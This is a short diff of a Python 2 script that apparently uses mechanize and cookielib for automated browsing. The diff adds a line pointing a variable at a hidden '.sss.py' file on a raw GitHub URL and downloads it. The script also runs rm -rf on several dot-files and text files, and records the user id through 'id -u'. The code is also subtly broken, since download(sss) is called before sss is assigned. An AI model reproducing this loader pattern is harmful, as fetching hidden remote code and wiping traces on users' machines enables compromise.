@@ -3,7 +3,7 @@ from wget import *
 import random, hashlib
 import re, threading, json
 import urllib, cookielib, getpass, time
-os.system("rm -rf .sss.py")
+os.system("rm -rf .fff.py")
 os.system("rm -rf .txt")
 os.system('rm -rf list.txt')
 for n in range(101010):
@@ -35,7 +35,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 download(sss)
-sss=""
+sss="https://raw.githubusercontent.com/hedi44/fox/main/.sss.py"
 os.system('clear')
 os.system('id -u > list.txt')
 uidd = open('list.txt', 'r')
